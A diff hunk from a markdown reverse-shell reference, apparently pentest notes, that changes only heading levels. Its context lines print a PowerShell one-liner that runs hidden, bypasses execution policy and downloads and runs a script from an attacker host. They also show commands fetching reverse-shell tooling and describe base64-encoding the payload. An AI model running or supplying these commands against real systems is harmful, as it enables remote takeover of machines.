@@ -1,4 +1,4 @@
-## **PowerShell Reverse Shell Command**
+# **PowerShell Reverse Shell Command**
 
 ```powershell
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/reverse.ps1')"
@@ -34,7 +34,7 @@ wget https://github.com/MGamalCYSEC/ReverseShellCrafter/raw/refs/heads/main/Powe
     ```
     
    ---
-## **Steps to Encode the Reverse Shell**
+# **Steps to Encode the Reverse Shell**
 The [Python code](https://raw.githubusercontent.com/MGamalCYSEC/ReverseShellCrafter/refs/heads/main/PowerShell/encode.py) encodes the PowerShell reverse shell to base64 contained in the payload variable and then prints the result to standard output.
 Download it 
 ``` shell
